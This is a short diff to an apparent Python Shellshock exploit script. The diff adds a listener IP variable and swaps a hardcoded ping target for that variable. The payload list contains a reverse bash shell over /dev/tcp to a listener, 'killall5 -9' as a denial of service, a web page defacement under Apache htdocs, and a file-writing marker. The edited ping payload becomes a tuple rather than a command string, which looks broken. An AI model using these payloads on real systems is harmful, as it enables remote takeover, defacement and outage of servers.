@@ -5,10 +5,11 @@ import sys, os
 target_host = ''
 target_port = 80  # Default HTTP port
 target_path = ''
+listener_ip = ''
 
 Payload_1 = 'echo \'Sh3llsh0ck3d!\' > exploited.txt'
 Payload_2 = 'cd /usr/local/apache2/htdocs/ && echo \'<html><body><h1>OMG i got Shellshocked!</h1></body></html>\''
-Payload_3 = 'ping 185.143.173.62'
+Payload_3 = 'ping', listener_ip
 Payload_4 = 'killall5 -9' # Sort of DOS
 Payload_5 = '/bin/bash -i >& /dev/tcp/%s 0>&1'  # Request to a listener
 Payload_6 = 'sleep 10'
